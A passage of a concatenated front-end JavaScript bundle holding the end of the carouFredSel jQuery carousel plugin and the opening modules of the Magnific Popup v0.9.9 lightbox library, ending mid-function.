        if (a.stopPropagation(), opts.pagination.container) {
          var d = opts.pagination.items || opts.items.visible,
            e = Math.ceil(itms.total / d);
          b && (opts.pagination.anchorBuilder && (opts.pagination.container.children().remove(), opts.pagination.container.each(function () {
            for (var a = 0; e > a; a++) {
              var b = $cfs.children().eq(gn_getItemIndex(a * d, 0, !0, itms, $cfs));
              $(this).append(opts.pagination.anchorBuilder.call(b[0], a + 1));
            }
          })), opts.pagination.container.each(function () {
            $(this).children().unbind(opts.pagination.event).each(function (a) {
              $(this).bind(opts.pagination.event, function (b) {
                b.preventDefault(), $cfs.trigger(cf_e("slideTo", conf), [a * d, -opts.pagination.deviation, !0, opts.pagination]);
              });
            });
          }));
          var f = $cfs.triggerHandler(cf_e("currentPage", conf)) + opts.pagination.deviation;
          return f >= e && (f = 0), 0 > f && (f = e - 1), opts.pagination.container.each(function () {
            $(this).children().removeClass(cf_c("selected", conf)).eq(f).addClass(cf_c("selected", conf));
          }), !0;
        }
      }), $cfs.bind(cf_e("updateSizes", conf), function () {
        var b = opts.items.visible,
          c = $cfs.children(),
          d = ms_getParentSize($wrp, opts, "width");
        if (itms.total = c.length, crsl.primarySizePercentage ? (opts.maxDimension = d, opts[opts.d.width] = ms_getPercentage(d, crsl.primarySizePercentage)) : opts.maxDimension = ms_getMaxDimension(opts, d), opts.responsive ? (opts.items.width = opts.items.sizesConf.width, opts.items.height = opts.items.sizesConf.height, opts = in_getResponsiveValues(opts, c, d), b = opts.items.visible, sz_setResponsiveSizes(opts, c)) : opts.items.visibleConf.variable ? b = gn_getVisibleItemsNext(c, opts, 0) : "*" != opts.items.filter && (b = gn_getVisibleItemsNextFilter(c, opts, 0)), !opts.circular && 0 != itms.first && b > itms.first) {
          if (opts.items.visibleConf.variable) var e = gn_getVisibleItemsPrev(c, opts, itms.first) - itms.first;else if ("*" != opts.items.filter) var e = gn_getVisibleItemsPrevFilter(c, opts, itms.first) - itms.first;else var e = opts.items.visible - itms.first;
          debug(conf, "Preventing non-circular: sliding " + e + " items backward."), $cfs.trigger(cf_e("prev", conf), e);
        }
        opts.items.visible = cf_getItemsAdjust(b, opts, opts.items.visibleConf.adjust, $tt0), opts.items.visibleConf.old = opts.items.visible, opts = in_getAlignPadding(opts, c);
        var f = sz_setSizes($cfs, opts);
        return $cfs.trigger(cf_e("updatePageStatus", conf), [!0, f]), nv_showNavi(opts, itms.total, conf), nv_enableNavi(opts, itms.first, conf), f;
      }), $cfs.bind(cf_e("destroy", conf), function (a, b) {
        return a.stopPropagation(), tmrs = sc_clearTimers(tmrs), $cfs.data("_cfs_isCarousel", !1), $cfs.trigger(cf_e("finish", conf)), b && $cfs.trigger(cf_e("jumpToStart", conf)), sz_restoreOrigCss($cfs.children()), sz_restoreOrigCss($cfs), FN._unbind_events(), FN._unbind_buttons(), "parent" == conf.wrapper ? sz_restoreOrigCss($wrp) : $wrp.replaceWith($cfs), !0;
      }), $cfs.bind(cf_e("debug", conf), function () {
        return debug(conf, "Carousel width: " + opts.width), debug(conf, "Carousel height: " + opts.height), debug(conf, "Item widths: " + opts.items.width), debug(conf, "Item heights: " + opts.items.height), debug(conf, "Number of items visible: " + opts.items.visible), opts.auto.play && debug(conf, "Number of items scrolled automatically: " + opts.auto.items), opts.prev.button && debug(conf, "Number of items scrolled backward: " + opts.prev.items), opts.next.button && debug(conf, "Number of items scrolled forward: " + opts.next.items), conf.debug;
      }), $cfs.bind("_cfs_triggerEvent", function (a, b, c) {
        return a.stopPropagation(), $cfs.triggerHandler(cf_e(b, conf), c);
      });
    }, FN._unbind_events = function () {
      $cfs.unbind(cf_e("", conf)), $cfs.unbind(cf_e("", conf, !1)), $cfs.unbind("_cfs_triggerEvent");
    }, FN._bind_buttons = function () {
      if (FN._unbind_buttons(), nv_showNavi(opts, itms.total, conf), nv_enableNavi(opts, itms.first, conf), opts.auto.pauseOnHover) {
        var a = bt_pauseOnHoverConfig(opts.auto.pauseOnHover);
        $wrp.bind(cf_e("mouseenter", conf, !1), function () {
          $cfs.trigger(cf_e("pause", conf), a);
        }).bind(cf_e("mouseleave", conf, !1), function () {
          $cfs.trigger(cf_e("resume", conf));
        });
      }
      if (opts.auto.button && opts.auto.button.bind(cf_e(opts.auto.event, conf, !1), function (a) {
        a.preventDefault();
        var b = !1,
          c = null;
        crsl.isPaused ? b = "play" : opts.auto.pauseOnEvent && (b = "pause", c = bt_pauseOnHoverConfig(opts.auto.pauseOnEvent)), b && $cfs.trigger(cf_e(b, conf), c);
      }), opts.prev.button && (opts.prev.button.bind(cf_e(opts.prev.event, conf, !1), function (a) {
        a.preventDefault(), $cfs.trigger(cf_e("prev", conf));
      }), opts.prev.pauseOnHover)) {
        var a = bt_pauseOnHoverConfig(opts.prev.pauseOnHover);
        opts.prev.button.bind(cf_e("mouseenter", conf, !1), function () {
          $cfs.trigger(cf_e("pause", conf), a);
        }).bind(cf_e("mouseleave", conf, !1), function () {
          $cfs.trigger(cf_e("resume", conf));
        });
      }
      if (opts.next.button && (opts.next.button.bind(cf_e(opts.next.event, conf, !1), function (a) {
        a.preventDefault(), $cfs.trigger(cf_e("next", conf));
      }), opts.next.pauseOnHover)) {
        var a = bt_pauseOnHoverConfig(opts.next.pauseOnHover);
        opts.next.button.bind(cf_e("mouseenter", conf, !1), function () {
          $cfs.trigger(cf_e("pause", conf), a);
        }).bind(cf_e("mouseleave", conf, !1), function () {
          $cfs.trigger(cf_e("resume", conf));
        });
      }
      if (opts.pagination.container && opts.pagination.pauseOnHover) {
        var a = bt_pauseOnHoverConfig(opts.pagination.pauseOnHover);
        opts.pagination.container.bind(cf_e("mouseenter", conf, !1), function () {
          $cfs.trigger(cf_e("pause", conf), a);
        }).bind(cf_e("mouseleave", conf, !1), function () {
          $cfs.trigger(cf_e("resume", conf));
        });
      }
      if ((opts.prev.key || opts.next.key) && $(document).bind(cf_e("keyup", conf, !1, !0, !0), function (a) {
        var b = a.keyCode;
        b == opts.next.key && (a.preventDefault(), $cfs.trigger(cf_e("next", conf))), b == opts.prev.key && (a.preventDefault(), $cfs.trigger(cf_e("prev", conf)));
      }), opts.pagination.keys && $(document).bind(cf_e("keyup", conf, !1, !0, !0), function (a) {
        var b = a.keyCode;
        b >= 49 && 58 > b && (b = (b - 49) * opts.items.visible, itms.total >= b && (a.preventDefault(), $cfs.trigger(cf_e("slideTo", conf), [b, 0, !0, opts.pagination])));
      }), $.fn.swipe) {
        var b = "ontouchstart" in window;
        if (b && opts.swipe.onTouch || !b && opts.swipe.onMouse) {
          var c = $.extend(!0, {}, opts.prev, opts.swipe),
            d = $.extend(!0, {}, opts.next, opts.swipe),
            e = function () {
              $cfs.trigger(cf_e("prev", conf), [c]);
            },
            f = function () {
              $cfs.trigger(cf_e("next", conf), [d]);
            };
          switch (opts.direction) {
            case "up":
            case "down":
              opts.swipe.options.swipeUp = f, opts.swipe.options.swipeDown = e;
              break;
            default:
              opts.swipe.options.swipeLeft = f, opts.swipe.options.swipeRight = e;
          }
          crsl.swipe && $cfs.swipe("destroy"), $wrp.swipe(opts.swipe.options), $wrp.css("cursor", "move"), crsl.swipe = !0;
        }
      }
      if ($.fn.mousewheel && opts.mousewheel) {
        var g = $.extend(!0, {}, opts.prev, opts.mousewheel),
          h = $.extend(!0, {}, opts.next, opts.mousewheel);
        crsl.mousewheel && $wrp.unbind(cf_e("mousewheel", conf, !1)), $wrp.bind(cf_e("mousewheel", conf, !1), function (a, b) {
          a.preventDefault(), b > 0 ? $cfs.trigger(cf_e("prev", conf), [g]) : $cfs.trigger(cf_e("next", conf), [h]);
        }), crsl.mousewheel = !0;
      }
      if (opts.auto.play && $cfs.trigger(cf_e("play", conf), opts.auto.delay), crsl.upDateOnWindowResize) {
        var i = function () {
            $cfs.trigger(cf_e("finish", conf)), opts.auto.pauseOnResize && !crsl.isPaused && $cfs.trigger(cf_e("play", conf)), sz_resetMargin($cfs.children(), opts), $cfs.trigger(cf_e("updateSizes", conf));
          },
          j = $(window),
          k = null;
        if ($.debounce && "debounce" == conf.onWindowResize) k = $.debounce(200, i);else if ($.throttle && "throttle" == conf.onWindowResize) k = $.throttle(300, i);else {
          var l = 0,
            m = 0;
          k = function () {
            var a = j.width(),
              b = j.height();
            (a != l || b != m) && (i(), l = a, m = b);
          };
        }
        j.bind(cf_e("resize", conf, !1, !0, !0), k);
      }
    }, FN._unbind_buttons = function () {
      var b = (cf_e("", conf), cf_e("", conf, !1));
      ns3 = cf_e("", conf, !1, !0, !0), $(document).unbind(ns3), $(window).unbind(ns3), $wrp.unbind(b), opts.auto.button && opts.auto.button.unbind(b), opts.prev.button && opts.prev.button.unbind(b), opts.next.button && opts.next.button.unbind(b), opts.pagination.container && (opts.pagination.container.unbind(b), opts.pagination.anchorBuilder && opts.pagination.container.children().remove()), crsl.swipe && ($cfs.swipe("destroy"), $wrp.css("cursor", "default"), crsl.swipe = !1), crsl.mousewheel && (crsl.mousewheel = !1), nv_showNavi(opts, "hide", conf), nv_enableNavi(opts, "removeClass", conf);
    }, is_boolean(configs) && (configs = {
      debug: configs
    });
    var crsl = {
        direction: "next",
        isPaused: !0,
        isScrolling: !1,
        isStopped: !1,
        mousewheel: !1,
        swipe: !1
      },
      itms = {
        total: $cfs.children().length,
        first: 0
      },
      tmrs = {
        auto: null,
        progress: null,
        startTime: getTime(),
        timePassed: 0
      },
      scrl = {
        isStopped: !1,
        duration: 0,
        startTime: 0,
        easing: "",
        anims: []
      },
      clbk = {
        onBefore: [],
        onAfter: []
      },
      queu = [],
      conf = $.extend(!0, {}, $.fn.carouFredSel.configs, configs),
      opts = {},
      opts_orig = $.extend(!0, {}, options),
      $wrp = "parent" == conf.wrapper ? $cfs.parent() : $cfs.wrap("<" + conf.wrapper.element + ' class="' + conf.wrapper.classname + '" />').parent();
    if (conf.selector = $cfs.selector, conf.serialNumber = $.fn.carouFredSel.serialNumber++, conf.transition = conf.transition && $.fn.transition ? "transition" : "animate", FN._init(opts_orig, !0, starting_position), FN._build(), FN._bind_events(), FN._bind_buttons(), is_array(opts.items.start)) var start_arr = opts.items.start;else {
      var start_arr = [];
      0 != opts.items.start && start_arr.push(opts.items.start);
    }
    if (opts.cookie && start_arr.unshift(parseInt(cf_getCookie(opts.cookie), 10)), start_arr.length > 0) for (var a = 0, l = start_arr.length; l > a; a++) {
      var s = start_arr[a];
      if (0 != s) {
        if (s === !0) {
          if (s = window.location.hash, 1 > s.length) continue;
        } else "random" === s && (s = Math.floor(Math.random() * itms.total));
        if ($cfs.triggerHandler(cf_e("slideTo", conf), [s, 0, !0, {
          fx: "none"
        }])) break;
      }
    }
    var siz = sz_setSizes($cfs, opts),
      itm = gi_getCurrentItems($cfs.children(), opts);
    return opts.onCreate && opts.onCreate.call($tt0, {
      width: siz.width,
      height: siz.height,
      items: itm
    }), $cfs.trigger(cf_e("updatePageStatus", conf), [!0, siz]), $cfs.trigger(cf_e("linkAnchors", conf)), conf.debug && $cfs.trigger(cf_e("debug", conf)), $cfs;
  }, $.fn.carouFredSel.serialNumber = 1, $.fn.carouFredSel.defaults = {
    synchronise: !1,
    infinite: !0,
    circular: !0,
    responsive: !1,
    direction: "left",
    items: {
      start: 0
    },
    scroll: {
      easing: "swing",
      duration: 500,
      pauseOnHover: !1,
      event: "click",
      queue: !1
    }
  }, $.fn.carouFredSel.configs = {
    debug: !1,
    transition: !1,
    onWindowResize: "throttle",
    events: {
      prefix: "",
      namespace: "cfs"
    },
    wrapper: {
      element: "div",
      classname: "caroufredsel_wrapper"
    },
    classnames: {}
  }, $.fn.carouFredSel.pageAnchorBuilder = function (a) {
    return '<a href="#"><span>' + a + "</span></a>";
  }, $.fn.carouFredSel.progressbarUpdater = function (a) {
    $(this).css("width", a + "%");
  }, $.fn.carouFredSel.cookie = {
    get: function (a) {
      a += "=";
      for (var b = document.cookie.split(";"), c = 0, d = b.length; d > c; c++) {
        for (var e = b[c]; " " == e.charAt(0);) e = e.slice(1);
        if (0 == e.indexOf(a)) return e.slice(a.length);
      }
      return 0;
    },
    set: function (a, b, c) {
      var d = "";
      if (c) {
        var e = new Date();
        e.setTime(e.getTime() + 1e3 * 60 * 60 * 24 * c), d = "; expires=" + e.toGMTString();
      }
      document.cookie = a + "=" + b + d + "; path=/";
    },
    remove: function (a) {
      $.fn.carouFredSel.cookie.set(a, "", -1);
    }
  }, $.extend($.easing, {
    quadratic: function (a) {
      var b = a * a;
      return a * (-b * a + 4 * b - 6 * a + 4);
    },
    cubic: function (a) {
      return a * (4 * a * a - 9 * a + 6);
    },
    elastic: function (a) {
      var b = a * a;
      return a * (33 * b * b - 106 * b * a + 126 * b - 67 * a + 15);
    }
  }));
})(jQuery);
;
/*! Magnific Popup - v0.9.9 - 2013-12-27
* http://dimsemenov.com/plugins/magnific-popup/
* Copyright (c) 2013 Dmitry Semenov; */
const JSHOOK_EVENTS = ['click', 'hover', 'submit'];
(function (e) {
  var t,
    n,
    i,
    o,
    r,
    a,
    s,
    l = "Close",
    c = "BeforeClose",
    d = "AfterClose",
    u = "BeforeAppend",
    p = "MarkupParse",
    f = "Open",
    m = "Change",
    g = "mfp",
    h = "." + g,
    v = "mfp-ready",
    C = "mfp-removing",
    y = "mfp-prevent-close",
    w = function () {},
    b = !!window.jQuery,
    I = e(window),
    x = function (e, n) {
      t.ev.on(g + e + h, n);
    },
    k = function (t, n, i, o) {
      var r = document.createElement("div");
      return r.className = "mfp-" + t, i && (r.innerHTML = i), o ? n && n.appendChild(r) : (r = e(r), n && r.appendTo(n)), r;
    },
    T = function (n, i) {
      t.ev.triggerHandler(g + n, i), t.st.callbacks && (n = n.charAt(0).toLowerCase() + n.slice(1), t.st.callbacks[n] && t.st.callbacks[n].apply(t, e.isArray(i) ? i : [i]));
    },
    E = function (n) {
      return n === s && t.currTemplate.closeBtn || (t.currTemplate.closeBtn = e(t.st.closeMarkup.replace("%title%", t.st.tClose)), s = n), t.currTemplate.closeBtn;
    },
    _ = function () {
      e.magnificPopup.instance || (t = new w(), t.init(), e.magnificPopup.instance = t);
    },
    S = function () {
      var e = document.createElement("p").style,
        t = ["ms", "O", "Moz", "Webkit"];
      if (void 0 !== e.transition) return !0;
      for (; t.length;) if (t.pop() + "Transition" in e) return !0;
      return !1;
    };
  w.prototype = {
    constructor: w,
    init: function () {
      var n = navigator.appVersion;
      t.isIE7 = -1 !== n.indexOf("MSIE 7."), t.isIE8 = -1 !== n.indexOf("MSIE 8."), t.isLowIE = t.isIE7 || t.isIE8, t.isAndroid = /android/gi.test(n), t.isIOS = /iphone|ipad|ipod/gi.test(n), t.supportsTransition = S(), t.probablyMobile = t.isAndroid || t.isIOS || /(Opera Mini)|Kindle|webOS|BlackBerry|(Opera Mobi)|(Windows Phone)|IEMobile/i.test(navigator.userAgent), o = e(document), t.popupsCache = {};
    },
    open: function (n) {
      i || (i = e(document.body));
      var r;
      if (n.isObj === !1) {
        t.items = n.items.toArray(), t.index = 0;
        var s,
          l = n.items;
        for (r = 0; l.length > r; r++) if (s = l[r], s.parsed && (s = s.el[0]), s === n.el[0]) {
          t.index = r;
          break;
        }
      } else t.items = e.isArray(n.items) ? n.items : [n.items], t.index = n.index || 0;
      if (t.isOpen) return t.updateItemHTML(), void 0;
      t.types = [], a = "", t.ev = n.mainEl && n.mainEl.length ? n.mainEl.eq(0) : o, n.key ? (t.popupsCache[n.key] || (t.popupsCache[n.key] = {}), t.currTemplate = t.popupsCache[n.key]) : t.currTemplate = {}, t.st = e.extend(!0, {}, e.magnificPopup.defaults, n), t.fixedContentPos = "auto" === t.st.fixedContentPos ? !t.probablyMobile : t.st.fixedContentPos, t.st.modal && (t.st.closeOnContentClick = !1, t.st.closeOnBgClick = !1, t.st.showCloseBtn = !1, t.st.enableEscapeKey = !1), t.bgOverlay || (t.bgOverlay = k("bg").on("click" + h, function () {
        t.close();
      }), t.wrap = k("wrap").attr("tabindex", -1).on("click" + h, function (e) {
        t._checkIfClose(e.target) && t.close();
      }), t.container = k("container", t.wrap)), t.contentContainer = k("content"), t.st.preloader && (t.preloader = k("preloader", t.container, t.st.tLoading));
      var c = e.magnificPopup.modules;
      for (r = 0; c.length > r; r++) {
        var d = c[r];
        d = d.charAt(0).toUpperCase() + d.slice(1), t["init" + d].call(t);
      }
      T("BeforeOpen"), t.st.showCloseBtn && (t.st.closeBtnInside ? (x(p, function (e, t, n, i) {
        n.close_replaceWith = E(i.type);
      }), a += " mfp-close-btn-in") : t.wrap.append(E())), t.st.alignTop && (a += " mfp-align-top"), t.fixedContentPos ? t.wrap.css({
        overflow: t.st.overflowY,
        overflowX: "hidden",
        overflowY: t.st.overflowY
      }) : t.wrap.css({
        top: I.scrollTop(),
        position: "absolute"
      }), (t.st.fixedBgPos === !1 || "auto" === t.st.fixedBgPos && !t.fixedContentPos) && t.bgOverlay.css({
        height: o.height(),
        position: "absolute"
      }), t.st.enableEscapeKey && o.on("keyup" + h, function (e) {
        27 === e.keyCode && t.close();
      }), I.on("resize" + h, function () {
        t.updateSize();
      }), t.st.closeOnContentClick || (a += " mfp-auto-cursor"), a && t.wrap.addClass(a);
      var u = t.wH = I.height(),
        m = {};
      if (t.fixedContentPos && t._hasScrollBar(u)) {
        var g = t._getScrollbarSize();
        g && (m.marginRight = g);
      }
      t.fixedContentPos && (t.isIE7 ? e("body, html").css("overflow", "hidden") : m.overflow = "hidden");
      var C = t.st.mainClass;
      return t.isIE7 && (C += " mfp-ie7"), C && t._addClassToMFP(C), t.updateItemHTML(), T("BuildControls"), e("html").css(m), t.bgOverlay.add(t.wrap).prependTo(t.st.prependTo || i), t._lastFocusedEl = document.activeElement, setTimeout(function () {
        t.content ? (t._addClassToMFP(v), t._setFocus()) : t.bgOverlay.addClass(v), o.on("focusin" + h, t._onFocusIn);
      }, 16), t.isOpen = !0, t.updateSize(u), T(f), n;
    },
    close: function () {
      t.isOpen && (T(c), t.isOpen = !1, t.st.removalDelay && !t.isLowIE && t.supportsTransition ? (t._addClassToMFP(C), setTimeout(function () {
        t._close();
      }, t.st.removalDelay)) : t._close());
    },
    _close: function () {
      T(l);
      var n = C + " " + v + " ";
      if (t.bgOverlay.detach(), t.wrap.detach(), t.container.empty(), t.st.mainClass && (n += t.st.mainClass + " "), t._removeClassFromMFP(n), t.fixedContentPos) {
        var i = {
          marginRight: ""
        };
        t.isIE7 ? e("body, html").css("overflow", "") : i.overflow = "", e("html").css(i);
      }
      o.off("keyup" + h + " focusin" + h), t.ev.off(h), t.wrap.attr("class", "mfp-wrap").removeAttr("style"), t.bgOverlay.attr("class", "mfp-bg"), t.container.attr("class", "mfp-container"), !t.st.showCloseBtn || t.st.closeBtnInside && t.currTemplate[t.currItem.type] !== !0 || t.currTemplate.closeBtn && t.currTemplate.closeBtn.detach(), t._lastFocusedEl && e(t._lastFocusedEl).focus(), t.currItem = null, t.content = null, t.currTemplate = null, t.prevHeight = 0, T(d);
    },
    updateSize: function (e) {
      if (t.isIOS) {
        var n = document.documentElement.clientWidth / window.innerWidth,
          i = window.innerHeight * n;
        t.wrap.css("height", i), t.wH = i;
      } else t.wH = e || I.height();
      t.fixedContentPos || t.wrap.css("height", t.wH), T("Resize");
    },
    updateItemHTML: function () {
      var n = t.items[t.index];
      t.contentContainer.detach(), t.content && t.content.detach(), n.parsed || (n = t.parseEl(t.index));
      var i = n.type;
      if (T("BeforeChange", [t.currItem ? t.currItem.type : "", i]), t.currItem = n, !t.currTemplate[i]) {
        var o = t.st[i] ? t.st[i].markup : !1;
        T("FirstMarkupParse", o), t.currTemplate[i] = o ? e(o) : !0;
      }
      r && r !== n.type && t.container.removeClass("mfp-" + r + "-holder");
      var a = t["get" + i.charAt(0).toUpperCase() + i.slice(1)](n, t.currTemplate[i]);
      t.appendContent(a, i), n.preloaded = !0, T(m, n), r = n.type, t.container.prepend(t.contentContainer), T("AfterChange");
    },
    appendContent: function (e, n) {
      t.content = e, e ? t.st.showCloseBtn && t.st.closeBtnInside && t.currTemplate[n] === !0 ? t.content.find(".mfp-close").length || t.content.append(E()) : t.content = e : t.content = "", T(u), t.container.addClass("mfp-" + n + "-holder"), t.contentContainer.append(t.content);
    },
    parseEl: function (n) {
      var i,
        o = t.items[n];
      if (o.tagName ? o = {
        el: e(o)
      } : (i = o.type, o = {
        data: o,
        src: o.src
      }), o.el) {
        for (var r = t.types, a = 0; r.length > a; a++) if (o.el.hasClass("mfp-" + r[a])) {
          i = r[a];
          break;
        }
        o.src = o.el.attr("data-mfp-src"), o.src || (o.src = o.el.attr("href"));
      }
      return o.type = i || t.st.type || "inline", o.index = n, o.parsed = !0, t.items[n] = o, T("ElementParse", o), t.items[n];
    },
    addGroup: function (e, n) {
      var i = function (i) {
        i.mfpEl = this, t._openClick(i, e, n);
      };
      n || (n = {});
      var o = "click.magnificPopup";
      n.mainEl = e, n.items ? (n.isObj = !0, e.off(o).on(o, i)) : (n.isObj = !1, n.delegate ? e.off(o).on(o, n.delegate, i) : (n.items = e, e.off(o).on(o, i)));
    },
    _openClick: function (n, i, o) {
      var r = void 0 !== o.midClick ? o.midClick : e.magnificPopup.defaults.midClick;
      if (r || 2 !== n.which && !n.ctrlKey && !n.metaKey) {
        var a = void 0 !== o.disableOn ? o.disableOn : e.magnificPopup.defaults.disableOn;
        if (a) if (e.isFunction(a)) {
          if (!a.call(t)) return !0;
        } else if (a > I.width()) return !0;
        n.type && (n.preventDefault(), t.isOpen && n.stopPropagation()), o.el = e(n.mfpEl), o.delegate && (o.items = i.find(o.delegate)), t.open(o);
      }
    },
    updateStatus: function (e, i) {
      if (t.preloader) {
        n !== e && t.container.removeClass("mfp-s-" + n), i || "loading" !== e || (i = t.st.tLoading);
        var o = {
          status: e,
          text: i
        };
        T("UpdateStatus", o), e = o.status, i = o.text, t.preloader.html(i), t.preloader.find("a").on("click", function (e) {
          e.stopImmediatePropagation();
        }), t.container.addClass("mfp-s-" + e), n = e;
      }
    },
    _checkIfClose: function (n) {
      if (!e(n).hasClass(y)) {
        var i = t.st.closeOnContentClick,
          o = t.st.closeOnBgClick;
        if (i && o) return !0;
        if (!t.content || e(n).hasClass("mfp-close") || t.preloader && n === t.preloader[0]) return !0;
        if (n === t.content[0] || e.contains(t.content[0], n)) {
          if (i) return !0;
        } else if (o && e.contains(document, n)) return !0;
        return !1;
      }
    },
    _addClassToMFP: function (e) {
      t.bgOverlay.addClass(e), t.wrap.addClass(e);
    },
    _removeClassFromMFP: function (e) {
      this.bgOverlay.removeClass(e), t.wrap.removeClass(e);
    },
    _hasScrollBar: function (e) {
      return (t.isIE7 ? o.height() : document.body.scrollHeight) > (e || I.height());
    },
    _setFocus: function () {
      (t.st.focus ? t.content.find(t.st.focus).eq(0) : t.wrap).focus();
    },
    _onFocusIn: function (n) {
      return n.target === t.wrap[0] || e.contains(t.wrap[0], n.target) ? void 0 : (t._setFocus(), !1);
    },
    _parseMarkup: function (t, n, i) {
      var o;
      i.data && (n = e.extend(i.data, n)), T(p, [t, n, i]), e.each(n, function (e, n) {
        if (void 0 === n || n === !1) return !0;
        if (o = e.split("_"), o.length > 1) {
          var i = t.find(h + "-" + o[0]);
          if (i.length > 0) {
            var r = o[1];
            "replaceWith" === r ? i[0] !== n[0] && i.replaceWith(n) : "img" === r ? i.is("img") ? i.attr("src", n) : i.replaceWith('<img src="' + n + '" class="' + i.attr("class") + '" />') : i.attr(o[1], n);
          }
        } else t.find(h + "-" + e).html(n);
      });
    },
    _getScrollbarSize: function () {
      if (void 0 === t.scrollbarSize) {
        var e = document.createElement("div");
        e.id = "mfp-sbm", e.style.cssText = "width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;", document.body.appendChild(e), t.scrollbarSize = e.offsetWidth - e.clientWidth, document.body.removeChild(e);
      }
      return t.scrollbarSize;
    }
  }, e.magnificPopup = {
    instance: null,
    proto: w.prototype,
    modules: [],
    open: function (t, n) {
      return _(), t = t ? e.extend(!0, {}, t) : {}, t.isObj = !0, t.index = n || 0, this.instance.open(t);
    },
    close: function () {
      return e.magnificPopup.instance && e.magnificPopup.instance.close();
    },
    registerModule: function (t, n) {
      n.options && (e.magnificPopup.defaults[t] = n.options), e.extend(this.proto, n.proto), this.modules.push(t);
    },
    defaults: {
      disableOn: 0,
      key: null,
      midClick: !1,
      mainClass: "",
      preloader: !0,
      focus: "",
      closeOnContentClick: !1,
      closeOnBgClick: !0,
      closeBtnInside: !0,
      showCloseBtn: !0,
      enableEscapeKey: !0,
      modal: !1,
      alignTop: !1,
      removalDelay: 0,
      prependTo: null,
      fixedContentPos: "auto",
      fixedBgPos: "auto",
      overflowY: "auto",
      closeMarkup: '<button title="%title%" type="button" class="mfp-close">&times;</button>',
      tClose: "Close (Esc)",
      tLoading: "Loading..."
    }
  }, e.fn.magnificPopup = function (n) {
    _();
    var i = e(this);
    if ("string" == typeof n) {
      if ("open" === n) {
        var o,
          r = b ? i.data("magnificPopup") : i[0].magnificPopup,
          a = parseInt(arguments[1], 10) || 0;
        r.items ? o = r.items[a] : (o = i, r.delegate && (o = o.find(r.delegate)), o = o.eq(a)), t._openClick({
          mfpEl: o
        }, i, r);
      } else t.isOpen && t[n].apply(t, Array.prototype.slice.call(arguments, 1));
    } else n = e.extend(!0, {}, n), b ? i.data("magnificPopup", n) : i[0].magnificPopup = n, t.addGroup(i, n);
    return i;
  };
  var P,
    O,
    z,
    M = "inline",
    B = function () {
      z && (O.after(z.addClass(P)).detach(), z = null);
    };
  e.magnificPopup.registerModule(M, {
    options: {
      hiddenClass: "hide",
      markup: "",
      tNotFound: "Content not found"
    },
    proto: {
      initInline: function () {
        t.types.push(M), x(l + "." + M, function () {
          B();
        });
      },
      getInline: function (n, i) {
        if (B(), n.src) {
          var o = t.st.inline,
            r = e(n.src);
          if (r.length) {
            var a = r[0].parentNode;
            a && a.tagName && (O || (P = o.hiddenClass, O = k(P), P = "mfp-" + P), z = r.after(O).detach().removeClass(P)), t.updateStatus("ready");
          } else t.updateStatus("error", o.tNotFound), r = e("<div>");
          return n.inlineElement = r, r;
        }
        return t.updateStatus("ready"), t._parseMarkup(i, {}, n), i;
      }
    }
  });
  var F,
    H = "ajax",
    L = function () {
      F && i.removeClass(F);
    },
    A = function () {
      L(), t.req && t.req.abort();
    };
  e.magnificPopup.registerModule(H, {
    options: {
      settings: null,
      cursor: "mfp-ajax-cur",
      tError: '<a href="%url%">The content</a> could not be loaded.'
    },
    proto: {
      initAjax: function () {
        t.types.push(H), F = t.st.ajax.cursor, x(l + "." + H, A), x("BeforeChange." + H, A);
      },
      getAjax: function (n) {
        F && i.addClass(F), t.updateStatus("loading");
        var o = e.extend({
          url: n.src,
          success: function (i, o, r) {
            var a = {
              data: i,
              xhr: r
            };
            T("ParseAjax", a), t.appendContent(e(a.data), H), n.finished = !0, L(), t._setFocus(), setTimeout(function () {
              t.wrap.addClass(v);
            }, 16), t.updateStatus("ready"), T("AjaxContentAdded");
          },
          error: function () {
            L(), n.finished = n.loadError = !0, t.updateStatus("error", t.st.ajax.tError.replace("%url%", n.src));
          }
        }, t.st.ajax.settings);
        return t.req = e.ajax(o), "";
      }
    }
  });
  var j,
    N = function (n) {
      if (n.data && void 0 !== n.data.title) return n.data.title;
      var i = t.st.image.titleSrc;
      if (i) {
        if (e.isFunction(i)) return i.call(t, n);
        if (n.el) return n.el.attr(i) || "";
      }
      return "";
    };
  e.magnificPopup.registerModule("image", {
    options: {
      markup: '<div class="mfp-figure"><div class="mfp-close"></div><figure><div class="mfp-img"></div><figcaption><div class="mfp-bottom-bar"><div class="mfp-title"></div><div class="mfp-counter"></div></div></figcaption></figure></div>',
      cursor: "mfp-zoom-out-cur",
      titleSrc: "title",
      verticalFit: !0,
      tError: '<a href="%url%">The image</a> could not be loaded.'
    },
    proto: {
      initImage: function () {
        var e = t.st.image,
          n = ".image";
        t.types.push("image"), x(f + n, function () {
          "image" === t.currItem.type && e.cursor && i.addClass(e.cursor);
        }), x(l + n, function () {
          e.cursor && i.removeClass(e.cursor), I.off("resize" + h);
        }), x("Resize" + n, t.resizeImage), t.isLowIE && x("AfterChange", t.resizeImage);
      },
      resizeImage: function () {
        var e = t.currItem;
        if (e && e.img && t.st.image.verticalFit) {
          var n = 0;
          t.isLowIE && (n = parseInt(e.img.css("padding-top"), 10) + parseInt(e.img.css("padding-bottom"), 10)), e.img.css("max-height", t.wH - n);
        }
      },
      _onImageHasSize: function (e) {
        e.img && (e.hasSize = !0, j && clearInterval(j), e.isCheckingImgSize = !1, T("ImageHasSize", e), e.imgHidden && (t.content && t.content.removeClass("mfp-loading"), e.imgHidden = !1));
      },
      findImageSize: function (e) {
        var n = 0,
          i = e.img[0],
          o = function (r) {
            j && clearInterval(j), j = setInterval(function () {
              return i.naturalWidth > 0 ? (t._onImageHasSize(e), void 0) : (n > 200 && clearInterval(j), n++, 3 === n ? o(10) : 40 === n ? o(50) : 100 === n && o(500), void 0);
            }, r);
          };
        o(1);
      },
      getImage: function (n, i) {
        var o = 0,
          r = function () {
            n && (n.img[0].complete ? (n.img.off(".mfploader"), n === t.currItem && (t._onImageHasSize(n), t.updateStatus("ready")), n.hasSize = !0, n.loaded = !0, T("ImageLoadComplete")) : (o++, 200 > o ? setTimeout(r, 100) : a()));
          },
          a = function () {
            n && (n.img.off(".mfploader"), n === t.currItem && (t._onImageHasSize(n), t.updateStatus("error", s.tError.replace("%url%", n.src))), n.hasSize = !0, n.loaded = !0, n.loadError = !0);
          },
          s = t.st.image,
          l = i.find(".mfp-img");
        if (l.length) {
          var c = document.createElement("img");
